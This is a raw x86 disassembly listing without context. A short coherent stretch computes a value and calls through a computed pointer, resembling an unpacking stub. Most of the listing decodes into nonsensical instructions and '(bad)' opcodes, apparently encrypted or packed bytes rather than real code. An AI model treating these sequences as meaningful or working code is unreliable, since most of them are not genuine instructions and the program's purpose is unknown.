  40dd88:	xchg   ecx,eax
  40dd89:	push   edx
  40dd8a:	sub    DWORD PTR [esi-0x2987ee1c],ecx
  40dd90:	shl    BYTE PTR [eax],0xde
  40dd93:	inc    ecx
  40dd94:	loop   0x40dde9
  40dd96:	mov    edi,0x9b0f2b98
  40dd9b:	jmp    0xaf05:0x6acde947
  40dda2:	ins    DWORD PTR es:[edi],dx
  40dda3:	dec    ecx
  40dda4:	jmp    0x40dd4a
  40dda6:	cmp    edx,ebp
  40dda8:	xchg   ebp,eax
  40dda9:	popa   
  40ddaa:	ret    0xf568
  40ddad:	repnz sbb BYTE PTR ds:0x97f4fba8,ah
  40ddb4:	mov    esi,0xe4761d4a
  40ddb9:	xor    edx,DWORD PTR [edi]
  40ddbb:	rcl    ch,cl
  40ddbd:	mov    bh,0xb9
  40ddbf:	and    dh,BYTE PTR [ebp-0x5b]
  40ddc2:	jg     0x40ddcc
  40ddc4:	adc    al,0x84
  40ddc7:	into   
  40ddc8:	stc    
  40ddc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddca:	fs sbb esp,eax
  40ddcd:	xchg   ebx,eax
  40ddcf:	sbb    esp,DWORD PTR [edi]
  40ddd1:	out    0x51,eax
  40ddd3:	cmp    eax,0xe7b11123
  40ddd8:	fdivrp st(2),st
  40ddda:	loop   0x40de40
  40dddc:	sti    
  40dddd:	push   ecx
  40ddde:	push   0xffffff81
  40dde0:	ins    BYTE PTR es:[edi],dx
  40dde1:	add    eax,DWORD PTR [edx+0x2a7aa077]
  40dde7:	sahf   
  40dde8:	sub    eax,0xc64759f4
  40dded:	sub    DWORD PTR [ecx],edx
  40ddef:	loop   0x40dde5
  40ddf1:	push   0x3a50bf4
  40ddf6:	hlt    
  40ddf7:	aam    0x74
  40ddf9:	test   BYTE PTR [eax],0xd7
  40ddfc:	and    eax,0xc64d176c
  40de01:	mov    dh,0x2
  40de03:	xor    ebp,DWORD PTR [eax+0x4f185fe8]
  40de09:	cwde   
  40de0a:	jp     0x40de5a
  40de0c:	jne    0x40dd9a
  40de0e:	sahf   
  40de0f:	sbb    eax,0x4996ff11
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x391c7830],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40deb1
  40de8e:	or     eax,0xb1eb900
  40de93:	inc    ecx
  40de94:	sbb    eax,0xb9a5ad96
  40de99:	lock lods al,BYTE PTR ds:[esi]
  40de9b:	or     ch,BYTE PTR [edx]
  40de9d:	cmp    BYTE PTR [edi+eiz*8-0x11],al
  40dea1:	stos   BYTE PTR es:[edi],al
  40dea2:	dec    edi
  40dea3:	test   BYTE PTR [edx],cl
  40dea5:	dec    ecx
  40dea6:	pushf  
  40dea7:	fld    QWORD PTR [eax]
  40dea9:	jns    0x40deb3
  40deab:	add    eax,0xd9456d2c
  40deb0:	mov    bl,0x7
  40deb2:	mov    edi,0xf3f98fee
  40deb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40deb8:	xor    eax,0x53904914
  40debd:	lea    edx,[ebp+0x19573ea1]
  40dec3:	int3   
  40dec4:	jbe    0x40de46
  40dec6:	rcl    BYTE PTR [ecx],cl
  40dec8:	xor    BYTE PTR [ebx],0xd8
  40decb:	and    eax,0xe0baca3e
  40ded0:	inc    ebx
  40ded1:	test   DWORD PTR [esi+0x79678c5c],ebx
  40ded7:	aad    0xb2
  40ded9:	and    eax,0xc61001c3
  40dede:	xor    eax,0x289bd999
  40dee3:	shr    edx,1
  40dee5:	jnp    0x40de6e
  40dee7:	xor    al,0x5f
  40dee9:	dec    edx
  40deea:	sbb    al,0x81
  40deec:	(bad)  
  40deed:	test   DWORD PTR [eax+0x4],0xf962ac0e
  40def4:	mov    dh,0x81
  40def6:	and    eax,0xbff0b42b
  40defb:	test   al,0x7
  40defd:	call   0xb0eef7dd
  40df02:	add    ecx,DWORD PTR [edx]
  40df04:	nop
  40df05:	sub    DWORD PTR [ecx-0x64],ebp
  40df08:	xchg   esp,eax
  40df09:	xor    ch,BYTE PTR [esi+0x7b1bc9b2]
  40df0f:	stc    
  40df10:	add    DWORD PTR [ecx],edi
  40df12:	mov    cl,0xae
  40df14:	pop    eax
  40df15:	inc    edx
  40df16:	ds sbb al,0x6e
  40df19:	gs out dx,eax
  40df1b:	fwait
  40df1c:	sahf   
  40df1d:	out    dx,al
  40df1e:	fild   WORD PTR [edi]
  40df20:	call   0xf0e8fe91
  40df25:	mov    bh,0x3e
  40df27:	imul   eax,ebp,0xffffffb9
  40df2a:	shl    edi,1
  40df2c:	xchg   esi,eax
  40df2d:	or     DWORD PTR [eax],edi
  40df2f:	xor    al,BYTE PTR [ebx]
  40df31:	fcom   DWORD PTR [ecx-0x63]
  40df34:	call   0xf0f04467
  40df39:	ss pop ebp
  40df3b:	aas    
  40df3c:	jns    0x40df4c
  40df3e:	xchg   ecx,eax
  40df3f:	pusha  
  40df40:	cwde   
  40df41:	cdq    
  40df42:	mov    al,ds:0x50fcbfb3
  40df47:	retf   
  40df48:	xor    al,0x31
  40df4a:	push   esp
  40df4b:	add    bh,0x74
  40df4e:	and    BYTE PTR [ecx+0x19],ah
  40df51:	inc    edx
  40df52:	retf   0x64cc
  40df55:	mov    edx,0x2e0357e
  40df5a:	cld    
  40df5b:	fld    QWORD PTR [ebp+0x7af14d46]
  40df61:	xlat   BYTE PTR ds:[ebx]
  40df62:	in     eax,0xbd
  40df64:	adc    DWORD PTR [esi+edx*1],esi
  40df67:	leave  
  40df68:	cmp    DWORD PTR [ebp-0xa3987a4],edi
  40df6e:	hlt    
  40df6f:	mov    BYTE PTR ds:0x3e4ac8c7,ch
  40df75:	out    dx,eax
  40df76:	rcr    DWORD PTR [ecx],0xb7
  40df79:	(bad)  
  40df7a:	mov    edx,0x25229f35
  40df7f:	xor    edi,edi
  40df81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df82:	dec    eax
  40df83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df84:	sti    
  40df85:	repz daa 
  40df87:	sub    BYTE PTR [ecx+0x21],0xa4
  40df8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df8c:	(bad)  
  40df8e:	std    
  40df8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df90:	inc    edi
  40df91:	sti    
  40df92:	imul   esp,DWORD PTR [esi],0xffffff84
  40df95:	(bad)  
  40df96:	stos   DWORD PTR es:[edi],eax
  40df97:	add    edi,edi
  40df99:	sbb    DWORD PTR [eax+0x381df0d3],esp
  40df9f:	lea    edi,[edx]
  40dfa1:	std    
  40dfa2:	xor    BYTE PTR [ecx],dl
  40dfa4:	jp     0x37bcf238
  40dfaa:	ror    DWORD PTR [ecx],0x23
  40dfad:	fiadd  WORD PTR [ebx-0x20ae9001]
  40dfb3:	jae    0x40df65
  40dfb5:	cwde   
  40dfb6:	outs   dx,BYTE PTR ds:[esi]
  40dfb7:	or     bl,ch
  40dfb9:	inc    ebx
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
